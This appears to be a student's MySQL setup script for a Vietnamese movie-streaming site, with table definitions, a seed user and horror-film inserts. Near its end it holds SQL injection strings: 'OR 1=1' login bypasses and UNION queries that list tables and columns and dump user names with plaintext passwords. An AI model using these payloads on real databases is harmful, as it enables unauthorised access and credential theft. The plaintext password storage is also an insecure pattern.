CREATE DATABASE xem_phim;
use xem_phim;

drop table `token` ;
drop table `user`;


Create table `user` (
  `id` int(11) not null auto_increment,
  `name` varchar(255) default null,
  `age` int(11) default null,
  `phone` varchar(11) default null,
  `email` varchar(255) unique default null ,
  `password` varchar(255) default null,
  primary key (`id`)
);

Create table `token` (
  `id_token` int(11) not null auto_increment,
  `id_user` int(11) ,
  `token` varchar(255) default null,
   primary key (`id_token`),
    FOREIGN KEY (`id_user`)
      REFERENCES `user`(`id`)
);
-- insert
insert into `user` values(1,'toan',22,'0867057221','nttoan2511@gmail.com','toan');
delete from `user` where id = 1;


drop table `movie`;
Create table `movie` (
   `id` int(11) not null auto_increment,
   `id_movie` int(11) default null,
   `category` varchar(255) default null ,
   `title` varchar(255) default null,
   `over_view` varchar(1000) default null,
   `poster_path` varchar(255) default null,
   `backdrop_path` varchar(255) default null,
   `release_date` char(10) default null,
   `run_time` int(10) default null,
   `vote_average` float(3) default null,
   `genres` varchar(255) default null,
   `url_video` varchar(255) default null,
   primary key (`id`)
);

Create table `movieInteractions`(
	`id_user` int(11) not null ,
    `id_movie` int(11) not null,
	`love` tinyint(1) default 0,
    foreign key (`id_user`) 
     references `user`(`id`),
	foreign key (`id_movie`)
     references `movie`(`id`)
);

SELECT movieInteractions.*, movie.id_movie
FROM movieInteractions
INNER JOIN movie ON movieInteractions.id_movie = movie.id WHERE movieInteractions.id_user = 2 AND movieInteractions.love = 1 AND movie.id_movie = 670292 LIMIT 1;

SELECT * FROM movieInteractions WHERE id_user = 2 AND love = 1;
insert into movieInteractions (`id_user`,`id_movie`) values (2,43);
update movieInteractions set `love` = 1 where id_user = 2 and id_movie = 43;

SELECT * FROM user WHERE email = "" AND password = '' OR 1=1 LIMIT 1,1;-- '
SELECT * FROM user WHERE email = '' OR 1=1 LIMIT 1,1;-- ' AND password = '';
SELECT * FROM user LIMIT 1,1;--
INSERT INTO movie (`id_movie`, `category`, `title`, `over_view`, `poster_path`, `backdrop_path`, `release_date`, `run_time`, `vote_average`, `genres`, `url_video`)  
VALUES 
(507089, 'horror', 'Năm Đêm Kinh Hoàng', 'Nhân viên bảo vệ Mike bắt đầu làm việc tại Freddy Fazbear\'s Pizza. Trong đêm làm việc đầu tiên, anh nhận ra mình sẽ không dễ gì vượt qua được ca đêm ở đây. Chẳng mấy chốc, anh sẽ vén màn sự thật đã xảy ra tại Freddy\'s.', '/6wz4JGel2IRvfna6M8xKrudfXUx.jpg', '/t5zCBSB5xMDKcDqe91qahCOUYVV.jpg', '2023-10-25', 110, 7.949, 'Phim Kinh Dị-Phim Bí Ẩn', 'GYOQBfT8UU4'),
(951491, 'horror', 'Lưỡi Cưa X', 'Lấy bối cảnh giữa các sự kiện của hai phần phim đầu phim, John Kramer ốm yếu và tuyệt vọng đến Mexico để thực hiện một quy trình y tế thử nghiệm và mạo hiểm với hy vọng chữa khỏi bệnh ung thư của mình bằng phép màu nhưng rồi mau chóng phát hiện ra rằng toàn bộ ca phẫu thuật là một trò lừa đảo nhằm lừa đảo những người dễ bị tổn thương nhất.', '/njQ5T5xVLZFk9pGFCwkZ0r6MMnM.jpg', '/dZbLqRjjiiNCpTYzhzL2NMvz4J0.jpg', '2023-09-26', 118, 7.414, 'Phim Kinh Dị-Phim Gây Cấn', 'UqcGdmJJVTY'),
(615656, 'horror', 'Cá Mập Siêu Bạo Chúa 2: Vực Sâu', 'Nhóm của Jonas Taylor tiếp cận gần khu vực Rãnh Mariana, nơi họ đụng độ một quái vật bí ẩn, khiến một thành viên trong nhóm thiệt mạng ngay sau đó. Cái chết của người đồng đội báo hiệu cho cả nhóm về một mối đe dọa to lớn đang giấu mình...', '/6x2CNod5RB3NkXSBJ81Y8KNy4g3.jpg', '/5mzr6JZbrqnqD8rCEvPhuCE5Fw2.jpg', '2023-08-02', 116, 6.76, 'Phim Hành Động-Phim Khoa Học Viễn Tưởng-Phim Kinh Dị', 'GwRDWsIIlI0'),
(830764, 'horror', 'Nghĩa Địa Ma Quái: Huyết Thống', 'Năm 1969, Jud Crandall khao khát được rời bỏ Ludlow, Maine, nhưng anh sớm phát hiện ra những bí mật nham hiểm được chôn giấu bên trong và buộc phải đối mặt với một câu chuyện gia đình đen tối sẽ khiến anh mãi mãi gắn bó với Ludlow.', '/yqnNLn24shYnZ6kqGpbwuB3NJ0D.jpg', '/dRWhJ4godwy40JdmNuRZy23oViY.jpg', '2023-09-23', 87, 6.118, 'Phim Kinh Dị', '1IgQpRyfwbE'),
(968051, 'horror', 'Ác Quỷ Ma Sơ II', 'Năm 1956 tại Pháp, một linh mục bị sát hại dã man, và sơ Irene đến để bắt đầu điều tra. Cô một lần nữa phải đối mặt với một ác quỷ mạnh mẽ.', '/kR4tDVZpm9kTJnk0kiVr3OJ47nD.jpg', '/gN79aDbZdaSJkFS1iVA17HplF2X.jpg', '2023-09-06', 110, 6.911, 'Phim Kinh Dị-Phim Bí Ẩn-Phim Gây Cấn', 'OIC5q-fhuUM'),
(807172, 'horror', 'Quỷ Ám: Tín Đồ', 'Phần tiếp theo của bộ phim năm 1973 kể về một cô bé 12 tuổi bị một thực thể ma quỷ bí ẩn chiếm hữu, buộc mẹ cô phải tìm đến sự giúp đỡ của hai linh mục để cứu cô.', '/atk4VEohSY2HdWliRoWElpFnSkR.jpg', '/azD31DjpV3PJfjF3h72LVw2WCSD.jpg', '2023-10-04', 111, 6.14, 'Phim Kinh Dị', 'lcK6CG1MN9s'),
(1008042, 'horror', 'Gọi Hồn Quỷ Dữ', 'Phim nói về một nhóm bạn phát hiện ra bàn tay ma quái cho phép họ triệu hồi các linh hồn bí ẩn. Họ dần bị cuốn vào trò chơi này mà không biết rằng một trong số họ đã đi quá xa và giải phóng thế lực hắc ám kinh hoàng.', '/tFVJwcCvQscxRr4BSndCHfpgSYV.jpg', '/iIvQnZyzgx9TkbrOgcXx0p7aLiq.jpg', '2023-07-26', 95, 7.197, 'Phim Kinh Dị-Phim Gây Cấn', 'jwXy9rBHV5I'),
(751237, 'horror', 'Umma: Bóng Ma Quá Khứ', 'Đang sống cuộc đời bình lặng tại trang trại với con gái, người phụ nữ buộc phải đối mặt với quá khứ khi đón hài cốt của bà mẹ ghẻ lạnh từ Hàn Quốc sang.', '/moLnqJmZ00i2opS0bzCVcaGC0iI.jpg', '/8DHvtmF15wGwkMOW3nqZmpEzEaq.jpg', '2022-03-18', 83, 5.37, 'Phim Kinh Dị-Phim Bí Ẩn', 'Vi5Od4-DrvU'),
(899445, 'horror', 'Hàm Tử Thần', 'Trên chuyến hành trình xuyên biển đoàn tụ gia đình, một cơn bão buộc Naomi rời khỏi lộ trình và vướng vào phi vụ nguy hiểm dưới lòng đại dương. Nhiệm vụ khó thành, hàm tử thần chực chờ nuốt chửng, liệu Naomi có thể thoát khỏi biển máu!?', '/fHoNBzhQhMiaufuRQJ3Fpb0HrWX.jpg', '/dvNrgldueQciabkYmlCnyhmaPoO.jpg', '2023-10-18', 84, 5.219, 'Phim Kinh Dị-Phim Gây Cấn-Phim Hành Động', 'rZctT49UyvQ'),
(635910, 'horror', 'Dracula: Quỷ Dữ Thức Tỉnh', 'Một đoàn thủy thủ tham gia vào nhiệm vụ vận chuyển một “đơn hàng” bí ẩn từ Carpathia đến London trên con tàu Demeter huyền thoại. Hải trình tưởng chừng như đơn giản thế nhưng lại ẩn chứa một cơn ác mộng kinh hoàng khi “đơn hàng” họ vận chuyển đang dần thức tỉnh. Nỗi khiếp sợ chính thức mở ra khi một vài thủy thủ bắt đầu phát hiện những dấu hiệu bất thường trên tàu, sự ra đi hàng loạt của động vật, cho đến cái chết bí ẩn của người thủy thủ đã khiến cho chuyến hành trình đến London trở nên ám ảnh hơn bao giờ hết. Giờ đây, tất cả mọi người phải tranh giành sự sống với mọi giác quan để chống lại con quái vật khát máu đã thức tỉnh trên tàu – Dracula. Liệu họ có cập bến thành công? Hay kết cục chỉ còn là sự chết chóc và một con tàu vô chủ?', '/r9c0GICzUYRmphrqvf8nsVQJUal.jpg', '/qEm4FrkGh7kGoEiBOyGYNielYVc.jpg', '2023-08-09', 119, 7.182, 'Phim Gây Cấn-Phim Kinh Dị', 'xUWGnn6oeZc'),
(709716, 'horror', 'Quái Vật Sông Mekong', 'Đặt bối cảnh tại làng Buengkan, một tỉnh thuộc miền Bắc Thái Lan, Quái Vật Sông Mekong chính thức trở thành cơn ác mộng đối với dân làng và được coi là khơi nguồn của thảm họa ngay khi nó phá hủy mọi thứ và khiến mọi người bị mất kết nối hoàn toàn với thế giới bên ngoài. Sự kiện chấn động toàn Thái Lan này đã khiến các cơ quan chức năng cùng những nhà khoa học vô tình đến Bueng Kan để tiến hành nghiên cứu phải huy động tất cả các lực lượng để bắt con quái vật điên rồ này trước khi quá muộn.', '/5qrCRVjIa1U8QiMpF3LoAkK8kpu.jpg', '/cvHEMN1NW2Re02kH90847YML2gu.jpg', '2022-08-18', 104, 5.8, 'Phim Kinh Dị-Phim Khoa Học Viễn Tưởng-Phim Gây Cấn', 'xnRYs0FICFU'),
(934433, 'horror', 'Tiếng Thét 6', 'Tara đang cố gắng sống một cuộc sống bình thường với tư cách là một sinh viên đại học ở thành phố New York, nhưng điều đó thật khó thực hiện khi chị gái Sam luôn dõi theo từng bước đi của cô. Nhưng bạn có thể đổ lỗi cho Sam? Nếu Sidney Prescott đã dạy chúng ta bất cứ điều gì, thì đó là một khi bạn bị Ghostface đánh dấu, bạn sẽ bị nguyền rủa suốt đời.', '/wDWwtvkRRlgTiUr6TyLSMX8FCuZ.jpg', '/44immBwzhDVyjn87b3x3l9mlhAD.jpg', '2023-03-08', 123, 7.138, 'Phim Kinh Dị-Phim Hình Sự-Phim Gây Cấn', 'xy7idKYzr7c'),
(1083862, 'horror', 'Resident Evil: Đảo Tử Thần', 'Đặc vụ D.S.O. Leon S. Kennedy đang thực hiện nhiệm vụ giải cứu Tiến sĩ Antonio Taylor khỏi những kẻ bắt cóc, thì bất ngờ bị một phụ nữ bí ẩn ngăn cản. Trong lúc đó, đặc vụ B.S.A.A. Chris Redfield đang điều tra một đại dịch xác sống ở San Francisco mà chưa xác định được nguyên nhân lây nhiễm. Điểm chung duy nhất của các nạn nhân là tất cả đều ghé thăm đảo Alcatraz không lâu trước đó. Lần theo manh mối này, Chris và đồng đội tìm đến hòn đảo, nơi một cơn kinh hoàng khác đang chờ đón họ.', '/2NR0LxpDL0QLva6VgxssbfHwq1T.jpg', '/7drO1kYgQ0PnnU87sAnBEphYrSM.jpg', '2023-06-22', 91, 7.54, 'Phim Hoạt Hình-Phim Hành Động-Phim Kinh Dị', 'g6dKnUw7GPo'),
(614479, 'horror', 'Quỷ Quyệt: Cửa Đỏ Vô Định', 'Phần tiếp theo của loạt phim kinh dị Insidious với sự góp mặt của dàn diễn viên gốc thuộc gia đình Lambert. Câu chuyện xoay quanh quyết định mở ra cánh cửa đỏ và đi sâu vào Cõi Vô Định của Josh (Patrick Wilson) và Dalton (Ty Simpkins) - nay đã trưởng thành - để tiêu diệt một lần và mãi mãi những con quỷ đang ám ảnh cả gia đình mình. Từ đó họ phải đối mặt với quá khứ tăm tối và đầy bí ản của gia đình, nơi những ám ảnh kinh hoàng nhất đang rình rập. Dàn diễn viên gốc từ Insidious trở lại gồm Patrick Wilson (kiêm vai trò đạo diễn), Ty Simpkins, Rose Byrne và Andrew Astor. Cũng có sự tham gia của Sinclair Daniel và Hiam Abbass. Phim do Jason Blum, Oren Peli, James Wan và Leigh Whannell sản xuất. Kịch bản được viết bởi Scott Teems dựa trên câu chuyện của Leigh Whannell, và nhân vật do Leigh Whannell tạo ra.', '/faafq0NouR3wSemwc77slLEJHId.jpg', '/i2GVEvltEu3BXn5crBSxgKuTaca.jpg', '2023-07-05', 107, 6.762, 'Phim Kinh Dị-Phim Bí Ẩn-Phim Gây Cấn', 'ZoBdltv1u3c'),
(758323, 'horror', 'Khắc Tinh Của Quỷ', 'Lấy cảm hứng từ những hồ sơ có thật của Cha Gabriele Amorth, Trưởng Trừ Tà của Vatican (Russell Crowe, đoạt giải Oscar®), bộ phim "The Pope\'s Exorcist" theo chân Amorth trong cuộc điều tra về vụ quỷ ám kinh hoàng của một cậu bé và dần khám phá ra những bí mật hàng thế kỷ mà Vatican đã cố gắng giấu kín.', '/ccaqnG8K0ub279MX19F2RPsEwal.jpg', '/hiHGRbyTcbZoLsYYkO4QiCLYe34.jpg', '2023-04-05', 103, 7.108, 'Phim Kinh Dị-Phim Gây Cấn', 'OoOQIjzFDwg'),
(1161048, 'horror', 'Hội Nghị Chết Chóc', 'Trong kỳ nghỉ tưởng chừng vô hại, một nhóm nhân viên khu vực công đủ thành phần không chỉ chiến đấu với mối bất hòa của chính họ mà còn với tên sát nhân khát máu.', '/xhty2fUzMIZSSLdEWhrao2sGKAF.jpg', '/rrucFNW1qOgSPL4n2Fy6CdpBDEY.jpg', '2023-10-13', 100, 5.363, 'Phim Kinh Dị-Phim Hài-Phim Gây Cấn', 'B9hpl8e-lQ4'),
(663712, 'horror', 'Gã Hề Điên Loạn 2', 'Sau khi được hồi sinh bởi một thực thể nham hiểm, Art the Clown quay trở lại thị trấn nhút nhát Miles County, nơi hắn nhắm đến một cô gái tuổi teen và em trai của cô ấy vào đêm Halloween.', '/8gLhu8UFPZfH2Hv11JhTZkb9CVl.jpg', '/cRdA9xjHBbobw4LJFsQ3j1CgpVq.jpg', '2022-10-06', 138, 6.798, 'Phim Kinh Dị-Phim Gây Cấn', 'rFUFkLkzw2I'),
(713704, 'horror', 'Ma Cây Trỗi Dậy', 'Hai chị em vô tình tìm thấy một quyển sách và những chiếc đĩa vinyl cũ kĩ mà không biết rằng mình đã làm sống lại những con quỷ khát máu. Lũ quỷ bắt đầu tung hoành bên trong một tòa nhà chung cư ở Los Angeles và điều này đã đẩy hai chị em vào một trận chiến sống còn khi họ phải đối mặt với một phiên bản gia đình kinh hoàng ngoài sức tưởng tượng.', '/2iwGRYzD1IlGfq2zX27uT8WBm6H.jpg', '/7bWxAsNPv9CXHOhZbJVlj2KxgfP.jpg', '2023-04-12', 96, 6.975, 'Phim Kinh Dị-Phim Gây Cấn', 'F-ktA-cs7No'),
(536554, 'horror', 'M3GAN', 'M3GAN là một điều kỳ diệu của trí tuệ nhân tạo, một con búp bê sống động như thật được lập trình để trở thành người bạn đồng hành tốt nhất của trẻ và cha mẹ. Được thiết kế bởi Gemma, một kỹ sư thiết kế người máy xuất sắc, M3GAN có thể nghe, xem và học hỏi trong suốt quá trình nó đóng vai trò là người bạn và người thầy, người đồng hành và người bảo vệ cho cả gia đình. Khi Gemma bất đắc dĩ trở thành người chăm sóc cho cô cháu gái 8 tuổi của mình, cô quyết định đưa cho cô bé một nguyên mẫu M3GAN, một quyết định dẫn đến một kết quả vượt ngoài mọi sự dự tính của cô.', '/tpHng7ZPa6K2yHJI5aPgHSIPcvx.jpg', '/4iYfKsWtKLsy18SOL9egydL91ok.jpg', '2022-12-28', 102, 7.176, 'Phim Khoa Học Viễn Tưởng-Phim Kinh Dị', 'gHFC14dTqdo'),
(423108, 'horror', 'Ám Ảnh Kinh Hoàng: Ma Xui Quỷ Khiến', 'Phần phim đen tối và đáng sợ nhất của vũ trụ kinh dị The Conjuring, dựa trên "Vụ án kẻ sát nhân quỷ nhập" gây rúng động nước Mỹ. Câu chuyện rùng rợn về vụ giết người và tội ác chưa từng được biết đến, gây sợ hãi cho hai nhà ngoại cảm Ed và Lorraine Warren. Đây là một trong những vụ án giật gân nhất từ hơn 3,000 hồ sơ của họ, bắt đầu bằng cuộc chiến giành linh hồn từ tay quỷ dữ cho một cậu bé, sau đó đưa họ vào trải nghiệm khủng khiếp nhất từ trước đến nay, để đánh dấu lần đầu tiên trong lịch sử nước Mỹ, một nghi phạm giết người tuyên bố mình bị quỷ nhập hồn, sai khiến cơ thể làm điều sai trái.', '/5boXtxQjExJ7EsVvqICt0vZTGRC.jpg', '/qi6Edc1OPcyENecGtz8TF0DUr9e.jpg', '2021-05-25', 111, 7.475, 'Phim Kinh Dị-Phim Bí Ẩn-Phim Gây Cấn', 'z3PB6WAsaJo');


-- SELECT * FROM movie WHERE category = 'trending' AND id_movie = '0' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema = "xem_phim";-- ;
-- SELECT * FROM movie WHERE category = 'trending' AND id_movie = '0' union select 1,2,3,4,column_name,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name = "user";-- ;
-- SELECT * FROM movie WHERE category = 'trending' AND id_movie = '0' union select 1,2,3,4,group_concat(name,':',password SEPARATOR ' ; '),6,7,8,9,10,11,12 FROM user-- ;

SELECT * FROM movie WHERE category = 'trending' AND id_movie = '872585'union select 1